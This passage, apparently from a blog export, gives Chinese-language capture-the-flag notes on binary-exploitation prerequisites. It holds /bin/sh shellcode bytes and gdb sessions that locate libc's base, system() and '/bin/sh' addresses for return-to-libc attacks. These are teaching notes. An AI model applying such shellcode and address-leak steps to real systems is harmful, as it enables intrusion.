sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh\n$ asd\nsh: 1: asd: not found\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep \"^ \" | cut -f2); do echo -n '\\x'$i; done; echo\n\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\n```\n## retn和leave和call\n\nretn: \n\n> 64位: pop rip;  rsp = rsp + 8\n>\n> 32位: pop eip; esp = esp + 4\n>\n> retn N操作：先eip=[esp]，然后esp=esp+4+N\n\nleave:\n\n> 64位: move rsp rbp; pop rbp               将rbp中的值传给rsp\n>\n> 32位: move esp ebp; pop ebp             将ebp中的值传给esp\n\ncall:\n\n> 64位: push rip; jump 目的位置\n>\n> 32位: push eip; jump 目的位置\n\n## 32位寻找偏移\n\n> pattern_create 50\n>\n> pattern_offset 字符串\n\n## 有符号整数比较和无符号整数比较\n\n| 指令 | 含义                                     | 运算符号 |\n| ---- | ---------------------------------------- | -------- |\n| jbe  | unsigned below or equal (lower or same)  | <=       |\n| jae  | unsigned above or equal (higher or same) | >=       |\n| jb   | unsigned below (lower)                   | <        |\n| ja   | unsigned above (higher)                  | >        |\n| jle  | signed less or equal                     | <=       |\n| jge  | signed greater or equal                  | >=       |\n| jl   | signed less than                         | <        |\n| jg   | signed greater than                      | >        |\n\n从上面的表中可以看出，\n\n对于无符号（unsigned）整数比较，使用的是单词是above或below；\n对于有符号(signed)整数比较，则使用的单词是greater或less。\n\n## 查找argv[0]变量的地址\n\n```\ngdb-peda$ find /home\nSearching for '/home' in: None ranges\nFound 6 results, display max 6 items:\n[stack] : 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\n[stack] : 0x7fffffffe8f4 (\"/home/tianji/Desktop/pwn/jarvis\")\n[stack] : 0x7fffffffeb12 (\"/home/tianji/Desktop/pwn/jarvis/smashes\")\n[stack] : 0x7fffffffeb48 (\"/home/tianji\")\n[stack] : 0x7fffffffeee7 (\"/home/tianji/.vimpkg/bin\")\n[stack] : 0x7fffffffefc8 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\ngdb-peda$ find 0x7fffffffdff6\nSearching for '0x7fffffffdff6' in: None ranges\nFound 2 results, display max 2 items:\n   libc : 0x7ffff7dd0508 --> 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\n[stack] : 0x7fffffffdc68 --> 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\ngdb-peda$ distance $rsp 0x7fffffffdc68\nFrom 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords\n```\n\n首先搜索字符串\"/home\",第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。\n\n当前$rsp的值就是 存在栈溢出变量的地址\n\n## ubuntu 16  64位默认加载地址\n\n运行程序，然后查看 /proc/pid/maps","slug":"pwn前置知识","published":1,"updated":"2018-07-23T12:35:37.925Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12i1001aqkdltjsi71ay","content":"<h2 id=\"调用约定\"><a href=\"#调用约定\" class=\"headerlink\" title=\"调用约定\"></a>调用约定</h2><p>32位和64位程序的区别, 更多的是体现在<a href=\"https://en.wikipedia.org/wiki/X86_calling_conventions\" target=\"_blank\" rel=\"noopener\">调用约定(Calling Convention)</a>上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.</p>\n<p>本文主要是介绍Linux平台下的漏洞利用, 所以就专注于<code>System V AMD64 ABI</code> 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat victim.c</span><br><span class=\"line\">int foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) &#123;</span><br><span class=\"line\">    return a + b + c + d + e + f + g + h;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    foo(1, 2, 3, 4, 5, 6, 7, 8);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ gcc victim.c -o victim</span><br><span class=\"line\">$ objdump -d victim | grep &quot;&lt;main&gt;:&quot; -A 11</span><br><span class=\"line\">00000000000006a0 &lt;main&gt;:</span><br><span class=\"line\"> 6a0:   55                      push   rbp</span><br><span class=\"line\"> 6a1:   48 89 e5                mov    rbp,rsp</span><br><span class=\"line\"> 6a4:   6a 08                   push   0x8</span><br><span class=\"line\"> 6a6:   6a 07                   push   0x7</span><br><span class=\"line\"> 6a8:   41 b9 06 00 00 00       mov    r9d,0x6</span><br><span class=\"line\"> 6ae:   41 b8 05 00 00 00       mov    r8d,0x5</span><br><span class=\"line\"> 6b4:   b9 04 00 00 00          mov    ecx,0x4</span><br><span class=\"line\"> 6b9:   ba 03 00 00 00          mov    edx,0x3</span><br><span class=\"line\"> 6be:   be 02 00 00 00          mov    esi,0x2</span><br><span class=\"line\"> 6c3:   bf 01 00 00 00          mov    edi,0x1</span><br><span class=\"line\"> 6c8:   e8 93 ff ff ff          call   660 &lt;foo&gt;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"查找libc基地址\"><a href=\"#查找libc基地址\" class=\"headerlink\" title=\"查找libc基地址\"></a>查找libc基地址</h2><p>方法一:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln</span><br><span class=\"line\">\tlinux-vdso.so.1 (0x00007ffff7ffa000)</span><br><span class=\"line\">\tlibc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)</span><br><span class=\"line\">\t/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<p>首先查找libc中某一函数的偏移，以system为例:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@</span><br><span class=\"line\">   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class=\"line\">  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>\n<p>或者使用ida也可以查找函数的偏移。</p>\n<p>寻找system的绝对地址：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class=\"line\">Catchpoint 1 (exec)</span><br><span class=\"line\">Reading symbols from vuln...done.</span><br><span class=\"line\">gdb-peda$ p system</span><br><span class=\"line\">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x5d0 &lt;system@plt&gt;</span><br><span class=\"line\">gdb-peda$ r</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class=\"line\">asdf</span><br><span class=\"line\">asdf</span><br><span class=\"line\"></span><br><span class=\"line\">[Inferior 1 (process 7107) exited normally]</span><br><span class=\"line\">Warning: not running or target is remote</span><br><span class=\"line\">gdb-peda$ p system</span><br><span class=\"line\">$2 = &#123;int (const char *)&#125; 0x7ffff7a33440 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>\n<p>然后就可以计算libc的基地址:</p>\n<blockquote>\n<p> 0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000</p>\n</blockquote>\n<h2 id=\"查找”-bin-sh”的偏移地址\"><a href=\"#查找”-bin-sh”的偏移地址\" class=\"headerlink\" title=\"查找”/bin/sh”的偏移地址\"></a>查找”/bin/sh”的偏移地址</h2><p>方法一:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">0x1b3e9a</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<p>在ida中查找。</p>\n<p>方法三:</p>\n<p>在环境变量中查找。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class=\"line\">Catchpoint 1 (exec)</span><br><span class=\"line\">Reading symbols from vuln...done.</span><br><span class=\"line\"><span class=\"meta\">gdb-peda$</span> b *main</span><br><span class=\"line\">Breakpoint 2 at 0x555555554739: file vuln.c, line 17.</span><br><span class=\"line\"><span class=\"meta\">gdb-peda$</span> r</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class=\"line\"></span><br><span class=\"line\">[----------------------------------registers-----------------------------------]</span><br><span class=\"line\">RAX: 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">RBX: 0x0 </span><br><span class=\"line\">RCX: 0x555555554790 (&lt;__libc_csu_init&gt;:\tpush   r15)</span><br><span class=\"line\">RDX: 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")</span><br><span class=\"line\">RSI: 0x7fffffffdde8 --&gt; 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")</span><br><span class=\"line\">RDI: 0x1 </span><br><span class=\"line\">RBP: 0x555555554790 (&lt;__libc_csu_init&gt;:\tpush   r15)</span><br><span class=\"line\">RSP: 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">RIP: 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class=\"line\">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class=\"line\">R10: 0x0 </span><br><span class=\"line\">R11: 0x1 </span><br><span class=\"line\">R12: 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">R13: 0x7fffffffdde0 --&gt; 0x1 </span><br><span class=\"line\">R14: 0x0 </span><br><span class=\"line\">R15: 0x0</span><br><span class=\"line\">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class=\"line\">[-------------------------------------code-------------------------------------]</span><br><span class=\"line\">   0x55555555472a &lt;shell+16&gt;:\tcall   0x5555555545d0 &lt;system@plt&gt;</span><br><span class=\"line\">   0x55555555472f &lt;shell+21&gt;:\tmov    edi,0x0</span><br><span class=\"line\">   0x555555554734 &lt;shell+26&gt;:\tcall   0x5555555545f0 &lt;exit@plt&gt;</span><br><span class=\"line\">=&gt; 0x555555554739 &lt;main&gt;:\tpush   rbp</span><br><span class=\"line\">   0x55555555473a &lt;main+1&gt;:\tmov    rbp,rsp</span><br><span class=\"line\">   0x55555555473d &lt;main+4&gt;:\tsub    rsp,0x120</span><br><span class=\"line\">   0x555555554744 &lt;main+11&gt;:\tmov    DWORD PTR [rbp-0x114],edi</span><br><span class=\"line\">   0x55555555474a &lt;main+17&gt;:\tmov    QWORD PTR [rbp-0x120],rsi</span><br><span class=\"line\">[------------------------------------stack-------------------------------------]</span><br><span class=\"line\">0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">0008| 0x7fffffffdd10 --&gt; 0x1 </span><br><span class=\"line\">0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")</span><br><span class=\"line\">0024| 0x7fffffffdd20 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffdd30 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be </span><br><span class=\"line\">0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">[------------------------------------------------------------------------------]</span><br><span class=\"line\">Legend: code, data, rodata, value</span><br><span class=\"line\"></span><br><span class=\"line\">Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17</span><br><span class=\"line\">warning: Source file is more recent than executable.</span><br><span class=\"line\">17\tint main(int argc, char* argv[]) &#123;</span><br><span class=\"line\"><span class=\"meta\">gdb-peda$</span> telescope 100</span><br><span class=\"line\">0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:\tmov    edi,eax)</span><br><span class=\"line\">0008| 0x7fffffffdd10 --&gt; 0x1 </span><br><span class=\"line\">0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")</span><br><span class=\"line\">0024| 0x7fffffffdd20 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffdd30 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be </span><br><span class=\"line\">0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">0064| 0x7fffffffdd48 --&gt; 0x7fffffffdde0 --&gt; 0x1 </span><br><span class=\"line\">0072| 0x7fffffffdd50 --&gt; 0x0 </span><br><span class=\"line\">0080| 0x7fffffffdd58 --&gt; 0x0 </span><br><span class=\"line\">0088| 0x7fffffffdd60 --&gt; 0xe8ddf05985fd83be </span><br><span class=\"line\">0096| 0x7fffffffdd68 --&gt; 0xe8dde0e6894383be </span><br><span class=\"line\">0104| 0x7fffffffdd70 --&gt; 0x7fff00000000 </span><br><span class=\"line\">0112| 0x7fffffffdd78 --&gt; 0x0 </span><br><span class=\"line\">0120| 0x7fffffffdd80 --&gt; 0x0 </span><br><span class=\"line\">0128| 0x7fffffffdd88 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:\tadd    r14,0x8)</span><br><span class=\"line\">0136| 0x7fffffffdd90 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 </span><br><span class=\"line\">0144| 0x7fffffffdd98 --&gt; 0x2225ab63 </span><br><span class=\"line\">0152| 0x7fffffffdda0 --&gt; 0x0 </span><br><span class=\"line\">0160| 0x7fffffffdda8 --&gt; 0x0 </span><br><span class=\"line\">0168| 0x7fffffffddb0 --&gt; 0x0 </span><br><span class=\"line\">0176| 0x7fffffffddb8 --&gt; 0x555555554610 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">0184| 0x7fffffffddc0 --&gt; 0x7fffffffdde0 --&gt; 0x1 </span><br><span class=\"line\">0192| 0x7fffffffddc8 --&gt; 0x55555555463a (&lt;_start+42&gt;:\thlt)</span><br><span class=\"line\">--More--(25/100)</span><br><span class=\"line\">0200| 0x7fffffffddd0 --&gt; 0x7fffffffddd8 --&gt; 0x1c </span><br><span class=\"line\">0208| 0x7fffffffddd8 --&gt; 0x1c </span><br><span class=\"line\">0216| 0x7fffffffdde0 --&gt; 0x1 </span><br><span class=\"line\">0224| 0x7fffffffdde8 --&gt; 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")</span><br><span class=\"line\">0232| 0x7fffffffddf0 --&gt; 0x0 </span><br><span class=\"line\">0240| 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")</span><br><span class=\"line\">0248| 0x7fffffffde00 --&gt; 0x7fffffffe1dd (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)</span><br><span class=\"line\">0256| 0x7fffffffde08 --&gt; 0x7fffffffe7c9 (\"LC_MEASUREMENT=zh_CN.UTF-8\")</span><br><span class=\"line\">0264| 0x7fffffffde10 --&gt; 0x7fffffffe7e4 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")</span><br><span class=\"line\">0272| 0x7fffffffde18 --&gt; 0x7fffffffe806 (\"LC_PAPER=zh_CN.UTF-8\")</span><br><span class=\"line\">0280| 0x7fffffffde20 --&gt; 0x7fffffffe81b (\"LC_MONETARY=zh_CN.UTF-8\")</span><br><span class=\"line\">0288| 0x7fffffffde28 --&gt; 0x7fffffffe833 (\"XDG_MENU_PREFIX=gnome-\")</span><br><span class=\"line\">0296| 0x7fffffffde30 --&gt; 0x7fffffffe84a (\"_=/usr/bin/gdb\")</span><br><span class=\"line\">0304| 0x7fffffffde38 --&gt; 0x7fffffffe859 (\"LANG=en_US.UTF-8\")</span><br><span class=\"line\">0312| 0x7fffffffde40 --&gt; 0x7fffffffe86a (\"DISPLAY=:0\")</span><br><span class=\"line\">0320| 0x7fffffffde48 --&gt; 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")</span><br><span class=\"line\">0328| 0x7fffffffde50 --&gt; 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")</span><br><span class=\"line\">0336| 0x7fffffffde58 --&gt; 0x7fffffffe8b8 (\"COLORTERM=truecolor\")</span><br><span class=\"line\">0344| 0x7fffffffde60 --&gt; 0x7fffffffe8cc (\"USERNAME=tianji\")</span><br><span class=\"line\">0352| 0x7fffffffde68 --&gt; 0x7fffffffe8dc (\"XDG_VTNR=1\")</span><br><span class=\"line\">0360| 0x7fffffffde70 --&gt; 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")</span><br><span class=\"line\">0368| 0x7fffffffde78 --&gt; 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")</span><br><span class=\"line\">0376| 0x7fffffffde80 --&gt; 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")</span><br><span class=\"line\">0384| 0x7fffffffde88 --&gt; 0x7fffffffe95a (\"XDG_SESSION_ID=1\")</span><br><span class=\"line\">0392| 0x7fffffffde90 --&gt; 0x7fffffffe96b (\"USER=tianji\")</span><br><span class=\"line\">--More--(50/100)</span><br><span class=\"line\">0400| 0x7fffffffde98 --&gt; 0x7fffffffe977 (\"DESKTOP_SESSION=ubuntu\")</span><br><span class=\"line\">0408| 0x7fffffffdea0 --&gt; 0x7fffffffe98e (\"QT4_IM_MODULE=fcitx\")</span><br><span class=\"line\">0416| 0x7fffffffdea8 --&gt; 0x7fffffffe9a2 (\"TEXTDOMAINDIR=/usr/share/locale/\")</span><br><span class=\"line\">0424| 0x7fffffffdeb0 --&gt; 0x7fffffffe9c3 (\"GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa\")</span><br><span class=\"line\">0432| 0x7fffffffdeb8 --&gt; 0x7fffffffea19 (\"DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path\")</span><br><span class=\"line\">0440| 0x7fffffffdec0 --&gt; 0x7fffffffea4c (\"PWD=/home/tianji/Desktop/sploit/bypassaslr_1\")</span><br><span class=\"line\">0448| 0x7fffffffdec8 --&gt; 0x7fffffffea79 (\"LINES=24\")</span><br><span class=\"line\">0456| 0x7fffffffded0 --&gt; 0x7fffffffea82 (\"HOME=/home/tianji\")</span><br><span class=\"line\">0464| 0x7fffffffded8 --&gt; 0x7fffffffea94 (\"TEXTDOMAIN=im-config\")</span><br><span class=\"line\">0472| 0x7fffffffdee0 --&gt; 0x7fffffffeaa9 (\"SSH_AGENT_PID=1606\")</span><br><span class=\"line\">0480| 0x7fffffffdee8 --&gt; 0x7fffffffeabc (\"QT_ACCESSIBILITY=1\")</span><br><span class=\"line\">0488| 0x7fffffffdef0 --&gt; 0x7fffffffeacf (\"XDG_SESSION_TYPE=x11\")</span><br><span class=\"line\">0496| 0x7fffffffdef8 --&gt; 0x7fffffffeae4 (\"XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop\")</span><br><span class=\"line\">0504| 0x7fffffffdf00 --&gt; 0x7fffffffeb37 (\"XDG_SESSION_DESKTOP=ubuntu\")</span><br><span class=\"line\">0512| 0x7fffffffdf08 --&gt; 0x7fffffffeb52 (\"LC_ADDRESS=zh_CN.UTF-8\")</span><br><span class=\"line\">0520| 0x7fffffffdf10 --&gt; 0x7fffffffeb69 (\"GJS_DEBUG_OUTPUT=stderr\")</span><br><span class=\"line\">0528| 0x7fffffffdf18 --&gt; 0x7fffffffeb81 (\"LC_NUMERIC=zh_CN.UTF-8\")</span><br><span class=\"line\">0536| 0x7fffffffdf20 --&gt; 0x7fffffffeb98 (\"ALL_PROXY=socks://127.0.0.1:1080/\")</span><br><span class=\"line\">0544| 0x7fffffffdf28 --&gt; 0x7fffffffebba (\"no_proxy=localhost,127.0.0.0/8,::1\")</span><br><span class=\"line\">0552| 0x7fffffffdf30 --&gt; 0x7fffffffebdd (\"GTK_MODULES=gail:atk-bridge\")</span><br><span class=\"line\">0560| 0x7fffffffdf38 --&gt; 0x7fffffffebf9 (\"NO_PROXY=localhost,127.0.0.0/8,::1\")</span><br><span class=\"line\">0568| 0x7fffffffdf40 --&gt; 0x7fffffffec1c (\"COLUMNS=79\")</span><br><span class=\"line\">0576| 0x7fffffffdf48 --&gt; 0x7fffffffec27 (\"WINDOWPATH=1\")</span><br><span class=\"line\">0584| 0x7fffffffdf50 --&gt; 0x7fffffffec34 (\"SHELL=/bin/bash\")</span><br><span class=\"line\">0592| 0x7fffffffdf58 --&gt; 0x7fffffffec44 (\"VTE_VERSION=5201\")</span><br></pre></td></tr></table></figure>\n<p>我们可以看到“SHELL=/bin/bash”的地址:<code>0x7fffffffec34</code>,然后去掉<code>SHELL</code>,这样“/bin/bash”的地址就是<code>0x7fffffffec3a</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ x/s 0x7fffffffec3a</span><br><span class=\"line\">0x7fffffffec3a:\t&quot;/bin/bash&quot;</span><br></pre></td></tr></table></figure>\n<p>当然，我这里是”/bin/bash”,所以这方法不可行。这时候，可以添加环境变量。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span 